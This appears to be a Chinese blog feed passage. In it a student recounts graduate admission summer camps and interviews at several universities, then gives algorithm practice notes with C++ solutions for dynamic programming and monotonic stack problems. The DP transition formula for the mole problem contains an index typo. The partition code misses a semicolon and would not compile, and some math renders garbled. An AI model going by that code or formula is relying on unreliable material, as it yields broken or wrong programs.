class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tap">样例输入<br>2<br>3<span class="hljs-number"> 3 </span>1<br>1<span class="hljs-number"> 2 </span>1 0<br>2<span class="hljs-number"> 3 </span>1 0<br>1<span class="hljs-number"> 3 </span>5 0<br>4<span class="hljs-number"> 4 </span>3<br>1<span class="hljs-number"> 3 </span>1 0<br>1<span class="hljs-number"> 2 </span>1 0<br>2<span class="hljs-number"> 4 </span>1 1<br>3<span class="hljs-number"> 4 </span>100 0<br>样例输出<br>2<br>4<br></code></pre></td></tr></table></figure><h5 id="提示-2">提示</h5><p>如果钥匙在节点1 ，则默认开始就拿到了钥匙。</p><p>对于样例1，从1节点出发走到节点2再到节点3即可到最短路。</p><p>对于样例2，需要先到节点3拿到钥匙，再返回节点1，经过节点2，到达节点4。</p><p>$1 n $</p><p><span class="math inline">\(1 \leq m \leq 100000\)</span></p><p>边权范围<span class="math inline">\([0, 10000]\)</span></p><h3 id="各团队考核">3.4.2 各团队考核</h3><p>当时是真挺想来的，而且第一天团队宣讲的时候我因为硬座16个小时到天津，宣讲时全称在睡觉准备下午的机试，所以参加了挺多团队的团队考核。第一个是天大NLP团队的考核，考核形式是<strong>8分钟自我介绍+5-10分钟问答+抽题翻译英语+抽专业课</strong>，当时面完就觉得自己表现的不错，事实上也是这样，后面老师就通知我拿到A+名额。但通知完后就渺无音训了，也不知道有没有被鸽，官网也不出名单。<strong>7月16号面试完的，9月10号才出夏令营A+名单</strong><spanclass="github-emoji" data-alias="sweat_smile" style=""data-fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f605.png?v8">😅</span>，这谁敢拿他当铁offer，后面就又去面了一大堆学校，最后也没去天大。（个人感觉挺可惜的，毕竟老师人也特别好，学术也特别强，要不是天大下头操作，就真去了）</p><p>其他团队考核方式都差不多，但天大很多老师<strong>不放实习</strong>！注意甄别导师。</p><p>PS：天大特别海，其实鸽不鸽老师都无所谓，老师不可能被鸽穿的，wl一堆。</p><h2 id="厦门大学人工智能学院专硕">3.5 厦门大学人工智能学院专硕</h2><p>本人因为是福建er，所以一直都挺想回厦大的，所以厦大在夏令营我基本大部分时间都在联系老师。厦大是<strong>弱com</strong>，只有老师推荐的学生才能入夏令营，而且<strong>厦大还会筛overqualified</strong>（双非乐园不是开玩笑的），相应的只要你进夏令营或者预推免了，基本上你被厦大录取的概率就有80%+了，因为厦大不怎么海，<strong>AI院的推荐比是1:1.5，信息学院好像是1:2到1:3</strong>，我参加夏令营的时候身边基本都是双非学校，反正竞争比很小。</p><p>我最先联系的是mac实验室，今年mac实验室联系时间是有ddl的，好像学院夏令营报名开始后两天就截止了，<strong>推荐想去mac实验室的同学尽量5月初左右联系</strong>。联系方式主要有两种，一种是发陶瓷邮件给纪老师，然后抄送给林助理；另一种是直接对点联系mac实验室下面的小导。报名截止后mac实验室会通过邮件发实验室介绍腾讯会议链接给纪老师觉得不错的学生。今年mac实验室是真被鸽怕了，在实验室介绍里又是搞签到，又是填申请意向表啥的，纪老师也在会议里说它只要真正想来mac实验室的学生，本科生有没有科研、有没有项目他并不是很在意。此外<strong>mac实验室给offer并且保证说来的但最后没来的学生，纪老师说会直接拉黑他的学校</strong>。</p><p>我所有活动都参加了，也填了意向表啥的，但我没在简历里说我是福建er，最终结局就是mac实验室不给我发面试题，当时快把我气死了，只能怪mac实验室没有缘分了。后来我去绿裙问了一下，好像很多211高rk和985都被斩杀了，可能是怕不会来。今年mac实验室好像觉得你可能不会来就会斩杀你，所以今年mac基本没什么人鸽。</p><p>被mac拒后我就开始海套，在报名快截止的前几天套到了asc的wcl老师，可能是因为福建er同时是211rk1，所以在实验室面试的时候就问了一些基础问题和未来发展意向后就拿到了老师的推荐。</p><p>厦大的夏令营有3天，同时可以提供宿舍和100块的餐食费（人文体验拉满），AI院的夏令营被分在了厦大的本部（爽死了），信息学院就在翔安了。第一天和每天的晚上基本都是参观学校和开讲座，<strong>要求必须全部参加，还有定点打卡啥的，只要有一个没参加就会剥夺优营资格</strong>。第二天早上是机试，机试有三道题，基本都是leetcodeeasy -mid的水平，基本上你能做出来两道题就能排到前20。<strong>此外AI院的机试是没有斩杀线的，信息学院的机试有斩杀线，好像没及格直接寄</strong>。面试环节在下午，面试顺序是随机抽取，同时会要求你上交手机啥的电子设备，我特别不幸被抽到了最后一个，一直等到了下午6点才到我。<strong>面试内容：3分钟自我介绍+ PPT个人介绍 + 10分钟交流环节</strong></p><p>问的问题：</p><ul><li>介绍一下LoRA微调方式的原理以及其他常见的微调方式</li><li>Slam方向难度比较高，如果后期老师给你分配一个特别难的任务，你会怎么办</li><li>未来规划是什么，是体制内还是互联网还是深造</li><li>你还参加了什么学校的夏令营</li><li>项目拷打</li><li>你本科阶段有接触过遥感或者slam方向的知识吗</li></ul><p>面试环节回答的特别差，而且一直被老师打断，我觉得很不被尊重。但可能是因为机试表现比较好，最后夏令营好像也是前20名拿到优营了，这是我没想到的。</p><p>但最后通过学长学姐了解到，老师学术能力特别强，但相应的也特别push，后面想了想我对slam方向也不是特别敢兴趣，而且也不想在研究生期间被push的太狠，于是就在8月初跟老师说不去了，老师也表示理解。</p><h2 id="湖南大学信息学院学硕">3.6 湖南大学信息学院学硕</h2><p>湖南大学夏令营的bar特别特别高，已知我学校给学硕的基本都是211rk1，专硕基本都是大专业rk2。当时线下面试的时候问了一圈同学，发现都是手握华五+航开济offer的同学来湖大旅游<spanclass="github-emoji" data-alias="sweat_smile" style=""data-fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f605.png?v8">😅</span>。<strong>湖大夏令营只要去了就能给offer</strong>，但感觉夏令营最终去湖大的估计都没几个人，可能也是这样所以湖大直接全员offer吧。</p><p>湖南大学夏令营考核<strong>没有机试，直接20分钟面试</strong>，面试的话不允许用ppt，所以会先让你进行5分钟的英文自我介绍，然后给简历，老师根据简历上的问题来问你，我那组面试老师整体非常和善，全程基本类似于聊天，没啥压力，但最后问了我一个出乎意料的问题：如何看待大模型时代企业和高校之间的定位，我说企业卡多可以做基础模型，高校卡少可以和企业合作，做一些垂直类的下游大模型，老师说我定位实际上和国家要求的不一样，可能有更好的回答吧。</p><p>因为是去拿保底的，所以对夏令营没啥期待的，事实也是这样，湖大夏令营基本什么都不包，全程其实挺花钱的，所以老师开宣讲会啥的我就基本也都没去。</p><h2 id="中山大学人工智能学院专硕">3.7 中山大学人工智能学院专硕</h2><p>中山AI学院的夏令营是我在去厦大的路上知道的，也是运气比较好，计科rk1没报这个学院，所以入营名额就给我了。中山AI的夏令营主要有两天，第一天是主要是开营仪式和老师团队介绍（还提供了糕点，夏令营开出了学术研讨会的感觉），然后会抽签你的面试顺序，我又是特别倒霉，被抽到了上午的最后一个。在开营仪式的时候院长说夏令营报了1300个人，最后学院筛选出了80个人参加夏令营，其实竞争还是挺激烈的。但院长说会优先考虑夏令营的学生（假的），夏令营候补和预推免一起排队，没人知道一起排队是怎么排的。</p><p>面试内容主要是<strong>5分钟PPT自我介绍+10分钟自由问答环节 + 抽翻译题+ 思政考核</strong></p><p>问的问题：</p><ul><li>思政问的问题好像是从严治党和发展之间的关系（不太清楚了），然后问了是不是党员</li><li>英文翻译抽的是一段对IoT设备的介绍</li><li>重点拷打了项目，没问专业课</li><li>为什么作为南方人本科会去东北上学</li><li>为什么会从东北又选择去中山读研</li><li>还参加了什么学校的夏令营</li><li>研究生对哪些方向感兴趣</li><li>研究生毕业想去体制内还是互联网还是深造</li></ul><p>面试完两天后出了结果，候补第8，问了下学长学姐说肯定能候补到，但我担心候补不到，就没联系老师。最后候补到的时候已经920多了，联系了一个风评特别好的香港回内地的老师，但石城大海后续就再没考虑中山了。</p><p>没想到929录取结束后，那个老师突然问我最终有没有去中山，原来当时老师没认真看以为我是预推免的，在名单上没看到我就没联系我。在保研结束后再看邮箱的时候发现我是夏令营的，就来问我有没有来中山，想收我做学生。好可惜啊，如果老师早点回我了我基本上就去中山了，只能说有缘无份，老师也觉得可惜。</p><h2 id="其他学校的情况">3.8 其他学校的情况</h2><ul><li><p>今年武大网安只要了我们学校计科的rk1和rk2进夏令营，武大网安专硕特香，只要两年，而且免学费，还是很推荐的。武大网安基本只要进了夏令营就可以拿到offer（90%的优营率），而且还是铁中铁，夏令营入的话基本可以选择学硕，但专硕我个人觉得更香。</p></li><li><p>对于没有学科评估的学校，估计今年以后想去浙软就得拼夏令营优营了，今年浙软预推免卡学科评估，不像以前一样211rk1都可以靠rk进浙软预推免</p></li></ul><h1 id="预推免">4. 预推免</h1><h2 id="个人感受-1">4.1 个人感受</h2><p>今年预推免形势和去年差别特别特别大，去年预推免形式入营形势整体还行，没听说过有报了三四十个，最后一个没入的情况。今天基本都这种情况，我自己也报了二三十个，最后只入了三个，当时整个人都快奔溃了，在学校不知道做什么，也学不进去啥。而且今年很奇怪的一点是很多学校都喜欢在928填系统那天面试，极限卡timing也不知道怎么想的。反正今年预推免形势特别特别难，明年估计更难。</p><h2 id="入营情况-1">4.2 入营情况</h2><table><thead><tr><th>学校学院</th><th>入营</th><th>结果</th><th>备注</th></tr></thead><tbody><tr><td>华中科技大学计算机学院专硕</td><td>✔</td><td>✔</td><td>华科能入营我是没想到的，但没入营问题也不大，真想去929下午打电话给华科就能去，华科经典的被鸽穿<spanclass="github-emoji" data-alias="laughing" style=""data-fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8">😆</span></td></tr><tr><td>华南理工大学计算机学院专硕</td><td>✔</td><td>✔</td><td>当时就入了它就去面面了，bar很高卡211rk1</td></tr><tr><td>国防科技大学计算机学院</td><td>✔</td><td>放弃参加</td><td>体检报告出不来就放弃参加了</td></tr><tr><td>北京理工大学珠海校区计算机学院专硕</td><td>✔</td><td>✔</td><td>最后悔的一集，后悔没去了，好后悔</td></tr><tr><td>北航杭州校区计算机专硕</td><td>✔</td><td>放弃参加</td><td>928面试谁去啊啊啊啊啊啊</td></tr><tr><td>东南大学软件学院专硕</td><td>✔</td><td>❌</td><td>英语面被问穿了，反正寄寄了</td></tr><tr><td>西工大软件学院专硕</td><td>✔</td><td>放弃参加</td><td>晚上面试，下午通知我来西安，我能瞬移？</td></tr><tr><td>南大软院专硕</td><td>❌</td><td></td><td>南大四杀</td></tr><tr><td>南大计算机学院专硕</td><td>❌</td><td></td><td>南大五杀</td></tr><tr><td>南大智能软件专硕</td><td>❌</td><td></td><td>南大六杀</td></tr><tr><td>中山计算机学院专硕</td><td>❌</td><td></td><td>中山三杀</td></tr><tr><td>中山软件学院专硕</td><td>❌</td><td></td><td>中山四杀</td></tr><tr><td>武大网安专硕</td><td>❌</td><td></td><td>梦校梦院，当时在酒店里哭了好久,真想去武大<span class="github-emoji"data-alias="cry" style=""data-fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">😢</span></td></tr><tr><td>武大计算机学院专硕</td><td>❌</td><td></td><td>武大三杀</td></tr><tr><td>武大遥感国重专硕</td><td>❌</td><td></td><td>武大四杀</td></tr><tr><td>西交人机所专硕</td><td>❌</td><td></td><td>西交三杀</td></tr><tr><td>华师计算机学院专硕</td><td>❌</td><td></td><td>华师三杀</td></tr><tr><td>华师软件学院专硕</td><td>❌</td><td></td><td>华师四杀</td></tr><tr><td>同济计算机学院专硕</td><td>❌</td><td></td><td>同济双杀</td></tr><tr><td>哈工大深圳专硕</td><td>❌</td><td></td><td>下头学校哈工大</td></tr><tr><td>哈工大威海专硕</td><td>❌</td><td></td><td>哈工大五杀</td></tr><tr><td>哈工大计算学部专硕</td><td>❌</td><td></td><td>哈工大六杀，只要985</td></tr><tr><td>自动化所</td><td>❌</td><td></td><td></td></tr><tr><td>软件所</td><td>❌</td><td></td><td></td></tr><tr><td>计算所</td><td>❌</td><td></td><td></td></tr><tr><td>信工所</td><td>❌</td><td></td><td>夏令营看不上，预推免被看不上</td></tr><tr><td>深先所</td><td>❌</td><td></td><td></td></tr><tr><td>中南计算机学硕</td><td>❌</td><td></td><td>软件进了好多，我们专业一个进不去</td></tr><tr><td>厦大计算机学院专硕</td><td>❌</td><td></td><td>要陶瓷</td></tr><tr><td>浙软专硕</td><td>❌</td><td></td><td>卡学科评估</td></tr><tr><td>南开人工智能</td><td>❌</td><td></td><td>不知道为啥没入，反正最后被鸽穿了</td></tr><tr><td>复旦计算机学院专硕</td><td>❌</td><td></td><td>怎么敢的？</td></tr><tr><td>北理网安</td><td>❌</td><td></td><td>知道进不去</td></tr><tr><td>中山系统工程学院专硕</td><td>❌</td><td></td><td>中山七杀</td></tr><tr><td>川大计算机专硕</td><td>❌</td><td></td><td>？？？？</td></tr><tr><td>国科大杭州</td><td>❌</td><td></td><td>？？？？</td></tr></tbody></table><h2 id="华中科技大学计算机学院专硕">4.3 华中科技大学计算机学院专硕</h2><h2 id="华南理工大学计算机学院专硕">4.4 华南理工大学计算机学院专硕</h2><h2 id="东南大学软件学院专硕">4.5 东南大学软件学院专硕</h2><h2 id="北理工珠海校区计算机技术专硕">4.6北理工珠海校区计算机技术专硕</h2><h2 id="其他学校的情况-1">4.7 其他学校的情况</h2><h1 id="总体感受">5. 总体感受</h1>]]></content>
    
    
    
    <tags>
      
      <tag>保研</tag>
      
      <tag>夏令营</tag>
      
      <tag>预推免</tag>
      
      <tag>计算机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>保研机试复习</title>
    <link href="/2024/04/02/%E4%BF%9D%E7%A0%94%E6%9C%BA%E8%AF%95%E5%A4%8D%E4%B9%A0/"/>
    <url>/2024/04/02/%E4%BF%9D%E7%A0%94%E6%9C%BA%E8%AF%95%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="洛谷p2285---hnoi2004-打鼹鼠">洛谷P2285 --[HNOI2004] 打鼹鼠</h1><h2 id="题目描述">题目描述</h2><p>鼹鼠是一种很喜欢挖洞的动物，但每过一定的时间，它还是喜欢把头探出到地面上来透透气的。根据这个特点阿牛编写了一个打鼹鼠的游戏：在一个<span class="math inline">\(n \times n\)</span>的网格中，在某些时刻鼹鼠会在某一个网格探出头来透透气。你可以控制一个机器人来打鼹鼠，如果<span class="math inline">\(i\)</span>时刻鼹鼠在某个网格中出现，而机器人也处于同一网格的话，那么这个鼹鼠就会被机器人打死。而机器人每一时刻只能够移动一格或停留在原地不动。机器人的移动是指从当前所处的网格移向相邻的网格，即从坐标为<span class="math inline">\((i, j)\)</span> 的网格移向 <spanclass="math inline">\((i-1, j), (i+1, j), (i, j-1), (i, j+1)\)</span>四个网格，机器人不能走出整个 <span class="math inline">\(n \timesn\)</span> 的网格。游戏开始时，你可以自由选定机器人的初始位置。</p><p>现在知道在一段时间内，鼹鼠出现的时间和地点，请编写一个程序使机器人在这一段时间内打死尽可能多的鼹鼠。</p><h3 id="输入格式">输入格式</h3><p>第一行为 $n, m <span class="math inline">\(（\)</span>n <spanclass="math inline">\(，\)</span>m ^4<spanclass="math inline">\(），其中\)</span>m$表示在这一段时间内出现的鼹鼠的个数，接下来的<span class="math inline">\(m\)</span> 行中每行有三个数据 <spanclass="math inline">\(\mathit{time}, x, y\)</span> 表示在游戏开始后<span class="math inline">\(\mathit{time}\)</span> 个时刻，在第 <spanclass="math inline">\(x\)</span> 行第 <spanclass="math inline">\(y\)</span>个网格里出现了一只鼹鼠。按递增的顺序给出。注意同一时刻可能出现多只鼹鼠，但同一时刻同一地点只可能出现一只鼹鼠。</p><h3 id="输出格式">输出格式</h3><p>仅包含一个正整数，表示被打死鼹鼠的最大数目。</p><h3 id="样例">样例</h3><h4 id="样例输入">样例输入</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">2 </span><span class="hljs-number">2</span>         <br><span class="hljs-symbol">1 </span><span class="hljs-number">1</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">2</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h4 id="样例输出">样例输出</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">1<br></code></pre></td></tr></table></figure><h2 id="解题分析">解题分析</h2><p>最开始的时候我没有想到方法，因为有时间、坐标x和y，我想的是开三维数组解决，但是这样会爆时间。最后看了下别人的思路，个人感觉还是比较妙的。</p><p>因为输入数据每个时间点是递增的，那么我们就可以转变思路，用动态规划的思想来分析<spanclass="math inline">\({t}_i\)</span>在时刻以<spanclass="math inline">\(({x}_i,{y}_i)\)</span>为结束的击打序列中，最多击打数是多少。同时机器人移动只能在四方向移动，那么我们可以认为只要第<spanclass="math inline">\(i\)</span>个鼹鼠与前<spanclass="math inline">\(i-1\)</span>个鼹鼠之间的曼哈顿距离小于相距时间的话就可以依次打到，这样就可以构建状态转移方程<span class="math display">\[dp[i] = \begin{cases}max(dp[i],dp[j]+1) &amp; \ abs({x_i} - {y_i}) +abs({y}_i-{y}_j)\leqslant abs({t}_i-{t}_j) \\ 1&amp; \ abs({x_i} -{y_i}) + abs({y}_i-{y}_j)\gt abs({t}_i-{t}_j)\end{cases}\]</span></p><h2 id="代码">代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e4</span>+<span class="hljs-number">10</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>&#123;<br>    <span class="hljs-type">int</span> t,x,y;<br>&#125;Node;<br><span class="hljs-type">int</span> dp[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    Node node[N]; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;m;i++) cin&gt;&gt;node[i].t&gt;&gt;node[i].x&gt;&gt;node[i].y;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;m;i++)&#123;<br>        dp[i] = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j &lt; i ;j++)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">abs</span>(node[i].x - node[j].x) + <span class="hljs-built_in">abs</span>(node[i].y - node[j].y) &lt;= <span class="hljs-built_in">abs</span>(node[i].t - node[j].t))<br>                dp[i] = <span class="hljs-built_in">max</span>(dp[i],dp[j] + <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;m;i++) res = <span class="hljs-built_in">max</span>(res,dp[i]);<br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure><h1 id="单调栈">单调栈</h1><h2 id="定义">定义：</h2><p>单调栈实际上就是栈，只是利用了一些巧妙的逻辑，使得每次新元素入栈后，栈内的元素都保持有序（单调递增或单调递减）。</p><p>单调栈用途不太广泛，只处理一种典型的问题，叫做 Next GreaterElement。</p><p><strong>凡是看到下一个更大或者下一个更小这一类的题用单调栈就完事了</strong></p><h2id="单调栈类型模板下一个更大元素">单调栈类型模板(下一个更大元素)</h2><p>首先，讲解 Next Greater Number的原始问题：给你一个数组，返回一个等长的数组，对应索引存储着下一个更大元素，如果没有更大的元素，就存-1。不好用语言解释清楚，直接上一个例子：</p><p>给你一个数组 [2,1,2,4,3]，你返回数组 [4,2,4,-1,-1]。</p><p>解释：第一个 2 后面比 2 大的数是 4; 1 后面比 1 大的数是 2；第二个 2后面比 2 大的数是 4; 4 后面没有比 4 大的数，填 -1；3 后面没有比 3大的数，填 -1。</p><p>这道题的暴力解法很好想到，就是对每个元素后面都进行扫描，找到第一个更大的元素就行了。但是暴力解法的时间复杂度是O(n^2)。</p><p>这个问题可以这样抽象思考：把数组的元素想象成并列站立的人，元素大小想象成人的身高。这些人面对你站成一列，如何求元素「2」的Next Greater Number呢？很简单，如果能够看到元素「2」，那么他后面可见的第一个人就是「2」的Next GreaterNumber，因为比「2」小的元素身高不够，都被「2」挡住了，第一个露出来的就是答案。</p><figure><img src="https://pic.leetcode-cn.com/1598145577-ziwCvD-1.png"alt="演示图片" /><figcaption aria-hidden="true">演示图片</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> num[N],ans[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;num[i];<br>    stack&lt;<span class="hljs-type">int</span>&gt; st;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = n - <span class="hljs-number">1</span>;i&gt;=<span class="hljs-number">0</span>;i--)&#123;<br>        <span class="hljs-keyword">while</span>(st.<span class="hljs-built_in">size</span>() &amp;&amp; st.<span class="hljs-built_in">top</span>() &lt;= num[i])&#123;<br>            st.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        ans[i] = st.<span class="hljs-built_in">size</span>()?st.<span class="hljs-built_in">top</span>():<span class="hljs-number">-1</span>;<br>        st.<span class="hljs-built_in">push</span>(num[i]);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;n;i++) cout&lt;&lt;ans[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="动态规划子问题-------分苹果">动态规划子问题 ----- 分苹果</h1><h2 id="样例题目">样例题目</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs excel">把M个弹珠放到<span class="hljs-built_in">N</span>个盘子里面（我们允许有的盘子为空），你能求出有多少种分法吗？（请注意，例如有三个盘子，我们将<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>和<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>，视为同一种分法）<br><br>输入格式<span class="hljs-symbol">:</span><br>输入包含多组测试样例。每组输入的第一行是一个整数<span class="hljs-built_in">t</span>。 接下来<span class="hljs-built_in">t</span>行，每行输入两个整数M和<span class="hljs-built_in">N</span>，代表有M个弹珠和<span class="hljs-built_in">N</span>个盘子。（<span class="hljs-number">0</span>=&lt;M&lt;=<span class="hljs-number">20</span>; <span class="hljs-number">0</span>&lt;<span class="hljs-built_in">N</span>&lt;=<span class="hljs-number">20</span>）<br><br>输出格式<span class="hljs-symbol">:</span><br>对于每对输入的M和<span class="hljs-built_in">N</span>，输出有多少种方法。<br><br>输入样例<span class="hljs-symbol">:</span><br><span class="hljs-number">1</span><br><span class="hljs-number">7</span> <span class="hljs-number">3</span><br>输出样例<span class="hljs-symbol">:</span><br><span class="hljs-number">8</span><br><br></code></pre></td></tr></table></figure><h2 id="分析">分析</h2><ol type="1"><li>当我们的盘子数<span class="math inline">\(j\)</span>多于弹珠数<spanclass="math inline">\(i\)</span>时，即使我们每个盘子都放一个，也会有空出来的盘子，那么我们就可以将问题转换为<spanclass="math inline">\(i\)</span>个盘子数<spanclass="math inline">\(i\)</span>个弹珠有几种分法。</li><li>当我们的盘子书<span class="math inline">\(j\)</span>小于或等于<spanclass="math inline">\(i\)</span>时，我们可以有两种选择：一种是现在每个盘子里至少放1个弹珠，那么问题可以转换为<spanclass="math inline">\(i-j\)</span>个弹珠以及<spanclass="math inline">\(j\)</span>个盘子有几种分法；另一种是我们允许空出来一个盘子（或者继续更多），那么问题就可以转换为在剩下<spanclass="math inline">\(j-1\)</span>个盘子以及<spanclass="math inline">\(i\)</span>个弹珠里有几种分法</li></ol><p><span class="math display">\[dp[i][j] = \begin{cases}dp[i][i] &amp; \ j&gt;i \\ dp[i-j][j] +dp[i][j-1] &amp; j&lt;=i\end{cases}\]</span></p><h2 id="代码-1">代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">210</span>,K = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> dp[N][N];<br><span class="hljs-type">int</span> n,k;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;k;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;=n;i++)dp[i][<span class="hljs-number">0</span>] = dp[<span class="hljs-number">0</span>][i] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>;j&lt;=k;j++)&#123;<br>            <span class="hljs-keyword">if</span>(j&gt;i)dp[i][j] = dp[i][i];<br>            <span class="hljs-keyword">else</span> dp[i][j] = dp[i-j][j] + dp[i][j<span class="hljs-number">-1</span>];<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;dp[n][k]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 